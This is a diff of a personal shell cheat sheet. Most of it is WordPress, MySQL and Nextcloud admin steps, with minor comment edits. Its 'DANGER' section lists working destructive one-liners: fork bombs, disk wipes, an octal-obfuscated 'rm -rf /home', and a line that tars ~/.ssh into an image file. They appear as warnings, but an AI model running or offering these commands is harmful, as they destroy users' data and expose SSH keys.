-$@ mysql> UPDATE wp_uniquename_links SET link_url = replace(link_url, '192.168.1.3', 'mynewurl.com');
-$@ mysql> UPDATE wp_uniquename_links SET link_image = replace(link_image, '192.168.1.3', 'mynewurl.com');
-$@ mysql> UPDATE wp_uniquename_postmeta SET meta_value = replace(meta_value, '192.168.1.3', 'mynewurl.com');
-$@ mysql> UPDATE wp_uniquename_usermeta SET meta_value = replace(meta_value, '192.168.1.3', 'mynewurl.com');
-$@ mysql> UPDATE wp_uniquename_options SET option_value = replace(option_value, '192.168.1.3', 'mynewurl.com') WHERE option_name = 'home' OR option_name = 'siteurl';
-## Check where site is directed now
-$@ mysql> SELECT option_value FROM wp_uniquename_options WHERE option_name = 'home' OR option_name = 'siteurl';
-##------------------------------------------
-## Go to webite to check if it worked. Sometimes the site is cached and will try to go to old cache, restart browser or delete old history.
-$> firefox http://yoursite
-## Go to admin section to check if that worked
-$> firefox http://yoursite/wp-admin
-##------------------------------------------
-## OR functions to do same
-### Wordpress mysql functions, may not work on remote ssh session
-## Show local mysql databases
-$> function mysqldatabases() { mysql -u root -p -e "SHOW DATABASES;" ; }
-##------------------------------------------
-## Show where wordpress redirects. Usage; wordpressmysqlcheck wp_database wp_uniquetableprefix_
-$> function wordpressmysqlcheck() { mysql -u root -p -e "USE $1; SELECT option_value FROM $2options WHERE option_name = 'home' OR option_name = 'siteurl';" ; }
-##------------------------------------------
-## Change where wordpress redirects. Usage; wordpressmysqlredirect wp_database wp_uniquetableprefix_ 192.168.1.10 mynewurl.com
-$> function wordpressmysqlredirect() { mysql -u root -p -e "USE $1; UPDATE $2posts SET guid = replace(guid, '$3','$4'); UPDATE $2posts SET post_content = replace(post_content, '$3', '$4'); UPDATE $2links SET link_url = replace(link_url, '$3', '$4'); UPDATE $2links SET link_image = replace(link_image, '$3', '$4'); UPDATE $2postmeta SET meta_value = replace(meta_value, '$3', '$4'); UPDATE $2usermeta SET meta_value = replace(meta_value, '$3', '$4'); UPDATE $2options SET option_value = replace(option_value, '$3', '$4') WHERE option_name = 'home' OR option_name = 'siteurl';" ; }
-##==========================================
-### To recover a mysql database without an export .sql
-## First make a new installation of mysql you can use to recover old one.
-## Need both ibdata1 and database folder containing .frm files
-## on old sever not working or a hard drive with database go to /var/lib/mysql find database and copy it
-$> cd /path/var/lib/
-## If local
-$> cp mysql /path/for/copy
-## Remote
-## Compress the needed database mysql folder
-$> tar -cxzf yourdatabasename_20190208.tar.gz mysql
-## Copy database to new server
-$> scp yourdatabasename_20190208.tar.gz $USER@192.168.1.3:/path/to/remote
-## On new server set up LAMP, see above
-## Unpack database folder with .frm files and ibdata1 file.
-$> tar -xvzf yourdatabasename_20190208.tar.gz
-## change directory into copy of old mysql folder
-$> cd mysql
-## Move newly created database ibdata1 file to replace with old one you are trying to recover
-$> mv /var/lib/mysql/ibdata1 /var/lib/mysql/ibdata1.default
-## Copy old ibdata1 to new database folder
-$> cp ibdata1 /var/lib/mysql
-## Copy the folder of the database you want to recover that holds the .frm files
-$> cp wp_databasename /var/lib/mysql
-$> cd /var/lib/mysql
-## Change permissions so mysql can use new database
-$> chown -R mysql:mysql wp_databasename
-$> chmod -R 750 wp_databasename
-## Sign into mysql and see if you can access database
-$> mysql -u root -p
-$@ mysql> SHOW DATABASES;
-$@ mysql> USE wp_database;
-$@ mysql> SHOW TABLES;
-$@ mysql> CHECK TABLE wp_commentsmeta;
-## IF ok then export the .sql
-$> mysqldump -u Your_Username -p wp_databasename > wp_database_backup_20190118.sql
-$> mysqldump -u Your_Username -p -h '192.168.1.3' wp_databasename > wp_database_backup_20190118.sql
-## Now you can import the sql into any other server.
-##==========================================
-### Change Table Prefix from default in working Wordpress site
-## 1. Take mysql database backup as a precaution. If a mistake is made, can re-import and try again.
-$> mysqldump -u [uname] -p -h 'localhost' databasename > databasename_backup_20190219.sql
-## 2. Change $table_prefix = ‘wp_’; in /var/www/html/wp-config.php
-$> sed -i "s/table_prefix  = 'wp_'/table_prefix  = 'wp_uniquename_'/"  /var/www/html/wp-config.php
-## 3. Change table names in mysql
-$> mysql -u root -p
-$@ mysql> USE databasename;
-## Format: RENAME TABLE `oldtablename` TO `newtablename`;
-## rename all the tables add any additional tables from plugins. Plugins may mess this up of course. Best practice is to remove and do procedure then reinstall reconfigure plugins.
-$@ mysql> RENAME TABLE wp_comments                  TO   wp_uniquename_comments                   ;
-$@ mysql> RENAME TABLE wp_links                     TO   wp_uniquename_links                      ;
-$@ mysql> RENAME TABLE wp_options                   TO   wp_uniquename_options                    ;
-$@ mysql> RENAME TABLE wp_postmeta                  TO   wp_uniquename_postmeta                   ;
-$@ mysql> RENAME TABLE wp_posts                     TO   wp_uniquename_posts                      ;
-$@ mysql> RENAME TABLE wp_term_relationships        TO   wp_uniquename_term_relationships         ;
-$@ mysql> RENAME TABLE wp_term_taxonomy             TO   wp_uniquename_term_taxonomy              ;
-$@ mysql> RENAME TABLE wp_termmeta                  TO   wp_uniquename_termmeta                   ;
-$@ mysql> RENAME TABLE wp_terms                     TO   wp_uniquename_terms                      ;
-$@ mysql> RENAME TABLE wp_usermeta                  TO   wp_uniquename_usermeta                   ;
-$@ mysql> RENAME TABLE wp_users                     TO   wp_uniquename_users                      ;
-$@ mysql> RENAME TABLE wp_commentmeta               TO   wp_uniquename_commentmeta                ;
-## 4. Rename in wp_options
-## in table wp_uniquename_options
-## Look under the option_name column header and change wp_user_roles to wp_uniquename_user_roles.
-## In this case
-$> mysql> UPDATE `wp_uniquename_options` SET `option_name` = 'wp_uniquename_user_roles' WHERE `option_name` = 'wp_user_roles';
-## 5. Rename in wp_usermeta
-## in table wp_uniquename_usermeta
-## Change all meta_key entries to new prefix
-$> mysql> UPDATE `wp_uniquename_usermeta` SET `meta_key` = REPLACE( `meta_key`, 'wp_', 'wp_uniquename_' );
-##------------------------------------------
-## Function to rename the table_prefix to a unique name /var/www/html/wp-config.php
-## Usage: wordpressmysqltableprefix wordpress_databasename tableprefix_ newtableprefix_
-## Example: wordpressmysqltableprefix wordpress wp_ wp_uniquename_
-$> function wordpressmysqltableprefix() { mysql -u root -p -e "USE $1; RENAME TABLE $2comments TO $3comments; RENAME TABLE $2links TO $3links; RENAME TABLE $2options TO $3options; RENAME TABLE $2postmeta TO $3postmeta; RENAME TABLE $2posts TO $3posts; RENAME TABLE $2term_relationships TO $3term_relationships; RENAME TABLE $2term_taxonomy TO $3term_taxonomy; RENAME TABLE $2termmeta TO $3termmeta; RENAME TABLE $2terms TO $3terms; RENAME TABLE $2usermeta TO $3usermeta; RENAME TABLE $2users TO $3users; RENAME TABLE $2commentmeta TO $3commentmeta; UPDATE `$3options` SET `option_name` = '$3user_roles' WHERE `option_name` = '$2user_roles'; UPDATE `$3usermeta` SET `meta_key` = REPLACE( `meta_key`, '$2', '$3' ); SHOW TABLES;" ; }
-##==========================================
-## ########################
-## ##    END Wordpress
-## ########################
-##==========================================
-## ################################################
-## ##    Nextcloud Cloud Server Install
-## ################################################
-##==========================================
-## https://nextcloud.com/
-$> wget https://download.nextcloud.com/server/releases/nextcloud-15.0.5.zip
-##==========================================
-### Nextcloud server setup
-## https://help.nextcloud.com/
-## https://civihosting.com/blog/how-to-install-nextcloud-server/
-##--------------------------------------------
-## LAMP install
-## Install newer LAMP Web Server implementation with php7.0
-$> sudo apt-get install apache2 mysql-server mysql-client php7.0 libapache2-mod-php7.0 php7.0-cli php7.0-gd libapache2-mod-php7.0 php7.0-mysql
-## php packages fileinfo. some duplicated from above
-$> sudo apt-get install php7.0-intl php-imagick php7.0-xml php7.0-zip php7.0-bz2 php7.0-opcache php7.0-gd php7.0-json php7.0-mysql php7.0-curl php7.0-mbstring php7.0-imap php7.0-gmp
-##--------------------------------------------
-## Install apache modules
-## There are some recommended Apache modules to be enabled for Nextcloud.
-$> sudo a2enmod rewrite mime dir env headers rewrite
-## Enable SSL
-$> sudo a2enmod ssl
-$> sudo a2ensite default-ssl
-## configuration file for Nextcloud in /etc/apache2/sites-available. Create a new file in that folder called nextcloud.conf
-$> sudo touch /etc/apache2/sites-available/nextcloud.conf
-$> sudo su
-## Setup Nextcloud in folder /var/www/nextcloud
-$> printf '## Setup apache2 for Nextcloud\nAlias /nextcloud "/var/www/nextcloud/"\n\n<Directory /var/www/nextcloud/>\n Options +FollowSymlinks\n AllowOverride All\n\n<IfModule mod_dav.c>\n Dav off\n</IfModule>\n\nSetEnv HOME /var/www/nextcloud\nSetEnv HTTP_HOME /var/www/nextcloud\n\n</Directory>\n' > /etc/apache2/sites-available/nextcloud.conf;
-## Check the file
-$> cat /etc/apache2/sites-available/nextcloud.conf
-## Or use an editor to add setting to apache2 available sites
-$> sudo mcedit /etc/apache2/sites-available/nextcloud.conf
-## Add the folowing without the $@
-$@ ## Setup apache for Nextcloud
-$@ Alias /nextcloud "/var/www/nextcloud/"
-$@
-$@ <Directory /var/www/nextcloud/>
-$@  Options +FollowSymlinks
-$@  AllowOverride All
-$@
-$@ <IfModule mod_dav.c>
-$@  Dav off
-$@ </IfModule>
-$@
-$@ SetEnv HOME /var/www/nextcloud
-$@ SetEnv HTTP_HOME /var/www/nextcloud
-$@
-$@ </Directory>
-## Save that file in /etc/apache2/sites-available and then create a symlink to /etc/apache2/sites-enabled with the command:
-$> ln -s /etc/apache2/sites-available/nextcloud.conf /etc/apache2/sites-enabled/nextcloud.conf
-$> exit
-## Finally, restart Apache with the command:
-$> sudo service apache2 restart
-##-----------------------------------------
-## Create a mysql database and user with password for nextcloud
-## Function to setup mysql for nextcloud
-## Setup mysql for wordpress. Usage: mysqlsetup $USER password databasename
-$> function mysqlsetup() { mysql -u root -p -e "CREATE USER '$1'@'localhost' IDENTIFIED BY '$2'; CREATE DATABASE $3; GRANT ALL PRIVILEGES ON $3.* TO $1@localhost IDENTIFIED BY '$2'; SHOW DATABASES;" ; }
-## Put in root mysql password press enter
-## Procede execution with a space so it does not go in .bash_history and expose the password, Example:
-$>  mysqlsetup $USER nextcloudpassword nextcloud
-##--------------------------------------------
-## PHP only allows 2MB files upload by default. For uploading bigger files to your server, increase the upload size in php.ini file.
-## search for upload_max_filesize and for post_max_size on the file and change both numbers to whatever you need.
-## See what set to now. For php7.0
-$> cat /etc/php/7.0/apache2/php.ini | grep "upload_max_filesize ="
-$> cat /etc/php/7.0/apache2/php.ini | grep "post_max_size ="
-## Change to what you want. For php7.0 to increase uploads to 2000mb
-$> sudo sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 2000M/' /etc/php/7.0/apache2/php.ini
-$> sudo sed -i 's/post_max_size = 8M/post_max_size = 2000M/' /etc/php/7.0/apache2/php.ini
-## Or use a editor and search for upload_max_filesize and for post_max_size on the file and change both numbers to whatever you need.
-## For php7.0
-$> sudo nano /etc/php/7.0/apache2/php.ini
-##---------------------------------------------
-## Nextcloud Install, manual best way. snap is very invasive, do not use.
-$> sudo apt-get install snapd
-$> sudo snap install nextcloud
-## OR
-## Setup using setup-nextcloud.php, manual best way
-$> wget https://download.nextcloud.com/server/installer/setup-nextcloud.php
-$> mkdir /var/www/nextcloud
-$> cp setup-nextcloud.php /var/www/nextcloud
-$> sudo chown -R root:www-data /var/www/nextcloud/
-$> sudo chmod -R 770 /var/www/nextcloud/
-## Use install wizard
-$> firefox http://IP_OF_SERVER/nextcloud/setup-nextcloud.php
-## Then Nextcloud first use setup wizard
-$> firefox http://IP_OF_SERVER/nextcloud
-## “Storage & database” and then click on “MySQL", enter the Database user, password and name
-## OR
-## Manual setup, manual best way
-## server packages
-$> wget https://download.nextcloud.com/server/releases/nextcloud-15.0.5.tar.bz2
-$> tar -vxjf nextcloud-9.0.50.tar.bz2
-## or
-$> wget https://download.nextcloud.com/server/releases/nextcloud-15.0.5.zip
-$> unzip nextcloud-15.0.5.zip
-## You should now see the folder nextcloud in the current working directory.
-## Apache HTTP server you may safely install Nextcloud in your Apache document root:
-$> cp -r nextcloud /path/to/webserver/document-root
-$> cp -r nextcloud /var/www
-## or
-$> sudo mv nextcloud /var/www
-## Set permissions
-$> chown -R root:www-data /var/www/nextcloud/
-$> sudo mkdir -p /var/www/nextcloud/data
-$> sudo mkdir -p /var/www/nextcloud/assets
-$> sudo mkdir -p /var/www/nextcloud/updater
-$> sudo find /var/www/nextcloud/ -type f -print0 | xargs -0 chmod 0640
-$> sudo find /var/www/nextcloud/ -type d -print0 | xargs -0 chmod 0750
-$> sudo chown -R root:www-data /var/www/nextcloud/
-$> sudo chown -R www-data:www-data /var/www/nextcloud/apps/
-$> sudo chown -R www-data:www-data /var/www/nextcloud/assets/
-$> sudo chown -R www-data:www-data /var/www/nextcloud/config/
-$> sudo chown -R www-data:www-data /var/www/nextcloud/data/
-$> sudo chown -R www-data:www-data /var/www/nextcloud/themes/
-$> sudo chown -R www-data:www-data /var/www/nextcloud/updater/
-## sudo chown -R www-data:www-data /var/www/nextcloud/{apps,assets,config,data,themes,updater}
-$> sudo chmod +x /var/www/nextcloud/occ
-## Make .htaccess then do
-$> chmod 0644 /var/www/nextcloud/.htaccess
-$> chown root:www-data /var/www/nextcloud/.htaccess
-$> chmod 0644 /var/www/nextcloud/data/.htaccess
-$> chown root:www-data /var/www/nextcloud/data/.htaccess
-##--------------------------------------------
-## Log in to Nextcloud
-## You’re finally ready to log in to your Nextcloud server. Point a browser to https://IP_OF_SERVER/nextcloud (where IP_OF_SERVER is the actual IP address of the server hosting Nextcloud).
-## Nextcloud setup wizard
-$> firefox http://IP_OF_SERVER/nextcloud
-## “Storage & database” and then click on “MySQL", enter the Database user, password and name
-##--------------------------------------------
-## The Nextcloud desktop client
-$> sudo apt-get nextcloud-client
-## This repository contains the stable releases of the client. Desktop client PPA compiled for Ubuntu.
-## You can update your system with unsupported packages from this untrusted PPA by adding ppa:nextcloud-devs/client to your system's Software Sources. (Read about installing)
-$> sudo add-apt-repository ppa:nextcloud-devs/client
-$> sudo apt-get update
-$> sudo apt-get nextcloud-client
-##--------------------------------------------
-##==========================================
-## #####################################################
-## ##    END  Nextcloud Cloud Server Install
-## #####################################################
+
 ##==========================================
 ## ##########################################################
 ## ##    END Setup
@@ -2943,7 +2367,7 @@ $>  $SECONDS          ## The number of seconds since the script was started.
 $>  $RANDOM           ## Returns a different random number each time is it referred to.
 $>  $LINENO           ## Returns the current line number in the Bash script.
 ##==========================================
-## generic regular expression pattern language:
+## shell. regex. generic regular expression pattern language:
 ## Print regular expression patterns
 $> function regexpattern() { echo '
 $> ##===================================
@@ -2976,7 +2400,7 @@ $>    $               ## matches end of line/string
 $>    [c1-c2]         ## matches $c_1$ through $c_2$
 $> ##===================================
 $> ## POSIX basic regular expressions, operators {}, (), +, | and ? must be escaped with \
-$> ##BRE Pattern     Pattern meaning
+$> ## BRE Pattern     Pattern meaning
 $>    no character    ## matches ""
 $>    c               ## matches "c"
 $>    p1p2            ## matches p1 then p2
@@ -3003,7 +2427,8 @@ $>    $               ## matches end of line/string
 $>    [c1-c2]         ## matches $c_1$ through $c_2$
 $> ##=================================== ' ; }
 ##==========================================
-### Short course in BASH
+### shell. Short course in BASH
+## zsh is not zero indexed, zsh arrays use 1-based indexing, so arrays will start with 1 not 0.
 ## http://matt.might.net/articles/bash-by-example/
 ### Variable
 $> name="admin"                            ## Set variable name
@@ -3013,7 +2438,7 @@ $> echo ${num}                             ## Prints 3
 ### Arrays
 $> foo=("a a a" "b b b" "c c c")           ## array foo, elements numbered starting at 0
 $> echo ${foo[2]}                          ## prints c c c
-$> echo $foo                               ## prints a a a
+$> echo $foo                               ## prints a a a b b b c c c
 $> echo ${foo[*]}                          ## "$*" combines all arguments into a single string. prints a a a b b b c c c
 $> bar=("${foo[@]}")                       ## set bar var to same as foo array, must have quote due to spaces in original array. "$@" requotes the individual arguments.
 $> echo $bar                               ## prints a a a
@@ -3092,8 +2517,8 @@ since all of this is going into cat on STDIN.
 UNTILHERE
 ## Redirect STADIN to a file
 $> cat > file.txt << EOF
-All of this printed,
-since all of this is going into cat on STDIN.
+All of this writen,
+since all of this is going into cat on STDIN redirected into a file.
 EOF
 ## STDIN is channel 0, STDOUT is channel 1, while STDERR is channel 2.
 ## To redirect error output (STDERR), use the operator 2>
@@ -3789,7 +3214,7 @@ function parse_git_unstaged() { git status 2> /dev/null | grep 'Changes not stag
 ##-----------------------------------------
 ##==========================================
 ## ###############
-## #   History   #
+## ##   History
 ## ###############
 ##------------------------------------------
 ## Increase the size of the .bash_history file
@@ -4284,7 +3709,7 @@ $> function parse_git_tracked() { git status 2> /dev/null | grep 'Changes to be 
 ## ZSH
 #PS1='%B%F{011}%\S^%b%F{154}$(thedate)%F{039}%~%f%B$(parse_git_branch)%F{011}$(parse_git_untracked)%F{012}$(parse_git_unstaged)%F{010}$(parse_git_tracked)%{$reset_color%}%b%f⚡'
 ## BASH
-PS1='\e[1;37m\h:\e[1;32m$(thedate)\e[1;34m\w\e[1;37m$(parse_git_branch)\e[1;33m$(parse_git_untracked)\e[1;34m$(parse_git_unstaged)\e[1;32m$(parse_git_tracked)\e[m⚡'
+$> PS1='\e[1;37m\h:\e[1;32m$(thedate)\e[1;34m\w\e[1;37m$(parse_git_branch)\e[1;33m$(parse_git_untracked)\e[1;34m$(parse_git_unstaged)\e[1;32m$(parse_git_tracked)\e[m⚡'
 ##-----------------------------------------
 ## #########################
 ## ##    Prompt
@@ -4610,6 +4035,7 @@ $> set -o ignoreeof
 ## ##############################
 ## ##    Framebuffer
 ## ##############################
+## shell. display. os.
 ##------------------------------------------
 ##==========================================
 $> sudo apt-get install fbi                          ## Framebuffer image viewer for tty login only, NO X gui running
@@ -4654,35 +4080,36 @@ $> omxplayer -o hdmi video.h264
 ## ##    DANGER
 ## ####################################################
 ##==========================================
-## Next time if you want to be retarded, at least run it inside docker
+## DANGER. Next time if you want to be retarded, at least run it inside docker
 ## $> docker -it run ubuntu bash
 ##==========================================
 ##
-## bash fork bomb crashes a computer
+## DANGER. bash fork bomb crashes a computer
 ## $> :(){ :|:& };:
 ##  Explanation
 ##  :()        #defines a function called : (accepts no arguments)
 ##  { :|:& };  #This is the function: It calls the function itself and pipes the output to the same function ":" and puts the process in the background. (Recursive invocation) with ; it ends the function definition
 ##  :          #Calls the function and creates havoc.
 ##==========================================
-## rm remove delete ALL files
+## DANGER. rm remove delete ALL files
 ## $> rm -fr * # system32
 ##
 ##==========================================
-## Command-line russian roulette
+## DANGER. Command-line russian roulette
 ## $> [ $[ $RANDOM % 6 ] = 0 ] && rm -rf --no-preserve-root / || echo "Click"
 ##==========================================
 ## https://www.tomshardware.com/news/x86-hidden-god-mode,37582.html
-## Some x86 CPUs, VIA C3 Nehemiah chips made in 2003, have hidden backdoors that let you seize root by sending a command to an undocumented RISC core that manages the main CPU,
+## DANGER. Some x86 CPUs, VIA C3 Nehemiah chips made in 2003, have hidden backdoors that let you seize root by sending a command to an undocumented RISC core that manages the main CPU,
 ## The command -- ".byte 0x0f, 0x3f" in Linux -- "isn't supposed to exist, doesn't have a name, and gives you root right away," Domas said, adding that he calls it "God Mode."
 ## $> .byte 0x0f, 0x3f
 ##==========================================
+## DANGER.
 ## $> dd if=/dev/zero of=/dev/da0 bs=4194304 seek=1024 count=399559 via: ssh -v -oStrictHostKeyChecking=no -oLogLevel=error -oUserKnownHostsFile=/dev/null aktv@94.155.49.9 -R 127.0.0.1:30081:127.0.0.1:22 -N >nl101
 ##==========================================
-## piping the microphone from one machine to the speakers of another. Not that dangerous just annoying
+## DANGER. piping the microphone from one machine to the speakers of another. Not that dangerous just annoying
 ## $> dd if=/dev/dsp | ssh -C user@host dd of=/dev/dsp
 ##==========================================
-## Have a youtube account? Want to upload random noise to youtube to waste their disk space?
+## DANGER. Have a youtube account? Want to upload random noise to youtube to waste their disk space?
 ## Example: https://www.youtube.com/watch?v=nFwciRbwNxw [Embed]
 ## Save this post as `Dockerfile`, then run `docker build -t youtubewaster FOLDER_OF_DOCKERFILE`, then run `docker run --rm youtubewaster YOUR_YOUTUBE_STREAM_KEY`
 ## $> FROM alpine
@@ -4693,19 +4120,20 @@ $> omxplayer -o hdmi video.h264
 ## $> chmod +x /bin/stream.bash
 ## $> ENTRYPOINT ["/bin/stream.bash"]
 ##==========================================
-## Fork bomb (dont actually execute)
+## DANGER. Fork bomb (dont actually execute)
 ## “$0” is a variable returning the name of the script that you call it in — so running “./$0&” twice amounts to the script running itself in a separate process twice. Show Sample Output
 ## $> echo -e “\x23\x21/bin/bash\n\.\/\$\0\&\n\.\/\$\0\&” > bomb.sh && ./bomb.sh
 ##==========================================
-##
+## DANGER.
 ## $> awk '{ s=$0; sub(/\[.*?\]/, "", s); if (s && !t[s]) { t[s]=1; print; } }'
 ##==========================================
+## DANGER.
 ## $> echo "`$'\162\155' $'\55\162\146' $'\57\150\157\155\145'`" | aplay [\code]
 ##==========================================
 ## DANGER erase all the things
 ## $> echo "`$'\162\155' $'\55\162\146' $'\57\150\157\155\145'`" | aplay
 ##==========================================
-## The resulting image will contain the combined data of the SSH directory and the output of curl ifconfig.co as an image in the 32-bit BGR color format.
+## DANGER. The resulting image will contain the combined data of the SSH directory and the output of curl ifconfig.co as an image in the 32-bit BGR color format.
 ## -f rawvideo: sets the input format to raw video.
 ## -r 1: sets the input video frame rate to 1 frame per second.
 ## -s 512x512: sets the input video resolution to 512x512 pixels.
@@ -4716,23 +4144,25 @@ $> omxplayer -o hdmi video.h264
 ## out.png: sets the output file name to out.png.
 ## ffmpeg -f rawvideo -r 1 -s 512x512 -pix_fmt bgr32 -i <(curl ifconfig.co; while true; do tar cf - -C ~/.ssh .; done) -vframes 1 -y out.pn
 ##==========================================
+## DANGER.
 ## history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head
 ##==========================================
-## use a random commit message
+## DANGER. use a random commit message
 ## $> git commit -m "$(curl -sL http://whatthecommit.com/index.txt)";
 ##==========================================
+## DANGER.
 ## $> yes>yes yes&;yes yes&
 ##==========================================
-## Filesystem created:
+## DANGER. Filesystem created:
 ## $> sudo tune2fs -l $(df -h / |(read; awk '{print $1; exit}')) | grep -i created
 ##==========================================
-## discard device sectors
+## DANGER. discard device sectors
 ## $> blkdiscard -f /dev/sda
 ##==========================================
 ## DANGER
 ## $> dd if=/dev/zero of=/
 ##==========================================
-## create 131072 empty files in the current directory with filenames ranging from 1 to 131072.
+## DANGER. create 131072 empty files in the current directory with filenames ranging from 1 to 131072.
 ## $> touch $(seq $((2**17)))&!
 ##==========================================
 ## DANGER
@@ -4771,7 +4201,7 @@ $> omxplayer -o hdmi video.h264
 ##
 ##==========================================
 ## #################################################
-## ##    Python Stuff
+## ##    Python
 ## #################################################
 ##==========================================
 <<COMMENT1
@@ -5039,29 +4469,29 @@ Ţ̶̡̺̟̻͊͌͊͌̉̆͊̓͘͘͜͝ͅȞ̸̡̛͎̪̼͓̟͂̿̎̂̿̓́̃͜͠͝
 
 COMMENT1
 ##==========================================
-## Change keyboard keys
-## Make PgUP/PgDOWN another Left/Right
-cat /usr/share/X11/xkb/symbols/pc
-    key  <INS> {    [  Insert       ]   };
-    key <HOME> {    [  Home         ]   };
-    key <PGUP> {    [  Prior        ]   };
-    key <DELE> {    [  Delete       ]   };
-    key  <END> {    [  End          ]   };
-    key <PGDN> {    [  Next         ]   };
-
-    key   <UP> {    [  Up           ]   };
-    key <LEFT> {    [  Left         ]   };
-    key <DOWN> {    [  Down         ]   };
-    key <RGHT> {    [  Right        ]   };
-sudo su
-cp /usr/share/X11/xkb/symbols/pc /usr/share/X11/xkb/symbols/pc.default
-sed -i 's/Prior/Left/' /usr/share/X11/xkb/symbols/pc
-sed -i 's/Next/Right/' /usr/share/X11/xkb/symbols/pc
-
 ## #################################################
 ## ##    END Extra Characters
 ## #################################################
 ##==========================================
+## os. hardware. keyboard. Change keyboard keys.
+## Make PgUP/PgDOWN another Left/Right.
+## cat /usr/share/X11/xkb/symbols/pc
+##     key  <INS> {    [  Insert       ]   };
+##     key <HOME> {    [  Home         ]   };
+##     key <PGUP> {    [  Prior        ]   };
+##     key <DELE> {    [  Delete       ]   };
+##     key  <END> {    [  End          ]   };
+##     key <PGDN> {    [  Next         ]   };
+##
+##     key   <UP> {    [  Up           ]   };
+##     key <LEFT> {    [  Left         ]   };
+##     key <DOWN> {    [  Down         ]   };
+##     key <RGHT> {    [  Right        ]   };
+## sudo su
+## cp /usr/share/X11/xkb/symbols/pc /usr/share/X11/xkb/symbols/pc.default
+## sed -i 's/Prior/Left/' /usr/share/X11/xkb/symbols/pc
+## sed -i 's/Next/Right/' /usr/share/X11/xkb/symbols/pc
+
 ##
 ##
 ##
@@ -5095,7 +4525,7 @@ $> DIR1=$(zenity --entry --text "Enter first directory to sync.") && DIR2=$(zeni
 ## List firefox addons
 $> jshon -e addons -a -e defaultLocale -e name -u < ~/.mozilla/firefox/*.[dD]efault/extensions.json
 ##==========================================
-## Remove link/shortcut icon overlays in mint linux
+## gui. Remove link/shortcut icon overlays in mint linux
 ## Get rid of shortcut/symlink/symbolic-link arrows from on top of desktop icons.
 $> sudo cp emblem-symbolic-link-tranparent.png /usr/share/icons/Mint-X/emblems/16/emblem-symbolic-link.png
 $> sudo cp emblem-symbolic-link-tranparent.png /usr/share/icons/Mint-X/emblems/22/emblem-symbolic-link.png
@@ -5115,7 +4545,7 @@ $> cd ~/.icons/Mint-X-White && \
 $> grep -ri -l "#a7c6df" ~/.icons/Mint-X-White | xargs sed -i -e 's/path3369-7" style="opacity:0.3/path3369-7" style="opacity:1/g' -e 's/path6127" style="opacity:0.4/path6127" style="opacity:1/g'  && \
 $> grep -ri -l "#a7c6df" ~/.icons/Mint-X-White | xargs sed -i -e 's/a7c6df/f7f7f7/g' -e 's/308fba/f7f7f8/g'
 ##------------------------------------------
-## Make LtBlue Theme
+## gui. Make LtBlue Theme
 ## Make home .icons folder to put new icon themes in and copy over Mint-X icons to alter
 $> mkdir ~/.icons && \
 $> cp -r /usr/share/icons/Mint-X ~/.icons/Mint-X-LtBlue && \
@@ -5131,7 +4561,7 @@ $> -e 's/path6127" style="opacity:0.4/path6127" style="opacity:1/g'
 ## Change color to LtBlue #cce8ff
 $> grep -ri -l "#a7c6df" ~/.icons/Mint-X-LtBlue | xargs sed -i -e 's/a7c6df/ffffff/g' -e 's/308fba/cce8ff/g' && \
 ##==========================================
-## Make home .icons folder to put new icon themes in and copy over Mint-X icons to alter
+## gui. Make home .icons folder to put new icon themes in and copy over Mint-X icons to alter
 $> mkdir ~/.icons && \
 $> cp -r /usr/share/icons/Mint-X ~/.icons/Mint-X-White && \
 $> cd ~/.icons/Mint-X-White && \
@@ -5155,7 +4585,7 @@ $> -e 's/path6127" style="opacity:0.4/path6127" style="opacity:1/g'  \
 $> -e "s/5e8048/888889/g" -e "s/4a6438/000001/g" \
 $> -e "s/aacb7d/$2/g" -e "s/709937/$1/g" ;
 ##------------------------------------------
-## Make any color icons in Mint17x from Mint-X-Aqua. Usage iconcolor HexForYour1stColor HexForYour2ndColor i.e. f7f7f9 bb55bb for Lavender & White
+## gui. Make any color icons in Mint17x from Mint-X-Aqua. Usage iconcolor HexForYour1stColor HexForYour2ndColor i.e. f7f7f9 bb55bb for Lavender & White
 $> function iconcolors () {
 $> 	cp -r /usr/share/icons/Mint-X-Aqua ~/.icons/Mint-X-$1-$2 ;
 $>     cd ~/.icons/Mint-X-$1-$2 ;
@@ -5169,7 +4599,7 @@ $>     -e 's/path3369-7-1" style="opacity:0.3/path3369-7-1" style="opacity:1/g' 
 $>     grep -ri -l "#a7c6df" | xargs sed -i -e "s/a7c6df/$2/g" -e "s/308fba/$1/g" ;
 $> }
 ##------------------------------------------
-## Make any color icons in Mint17x from the full Mint-X icon set. Usage: iconcolor HexForYour1stColor HexForYour2ndColor i.e. bb55bb f7f7f9 for Lavender & White
+## gui. Make any color icons in Mint17x from the full Mint-X icon set. Usage: iconcolor HexForYour1stColor HexForYour2ndColor i.e. bb55bb f7f7f9 for Lavender & White
 $> function iconcolors () {
 $> 	cp -r /usr/share/icons/Mint-X ~/.icons/Mint-X-$1-$2 ;
 $>     cd ~/.icons/Mint-X-$1-$2 ;
@@ -5184,10 +4614,10 @@ $>     grep -ri -l "#aacb7d" | xargs sed -i -e "s/5e8048/888889/g" -e "s/4a6438/
 $>     grep -ri -l "#aacb7d" | xargs sed -i -e "s/aacb7d/$2/g" -e "s/709937/$1/g" ;
 $> }
 ##------------------------------------------
-## Transform Mint Linux 17 icons to create any color
+## gui. Transform Mint Linux 17 icons to create any color
 $> function iconcolors () { cp -r /usr/share/icons/Mint-X-Aqua ~/.icons/Mint-X-$1-$2 ; cd ~/.icons/Mint-X-$1-$2 ; grep -ri -l "#a7c6df" | xargs sed -i -e 's/"opacity:0/"opacity:1/g' -e "s/0b5a7d/888889/g" -e "s/a7c6df/$2/g" -e "s/308fba/$1/g" ; }
 ##------------------------------------------
-## Make any color icons from Mint-X-Aqua. Usage: iconcolor HexForYour1stColor HexForYour2ndColor i.e. bb55bb f7f7f9 for Lavender & White
+## gui. Make any color icons from Mint-X-Aqua. Usage: iconcolor HexForYour1stColor HexForYour2ndColor i.e. bb55bb f7f7f9 for Lavender & White
 $> function iconcolorMint-X-Aqua () {
 $> 	cp -r /usr/share/icons/Mint-X-Aqua ~/.icons/Mint-X-$1-$2 ;
 $>     cd ~/.icons/Mint-X-$1-$2 ;
@@ -5203,7 +4633,7 @@ $>     grep -ri -l "#a7c6df" | xargs sed -i -e "s/0b5a7d/888889/g" ;
 $>     grep -ri -l "#a7c6df" | xargs sed -i -e "s/a7c6df/$2/g" -e "s/308fba/$1/g" ;
 $> }
 ##------------------------------------------
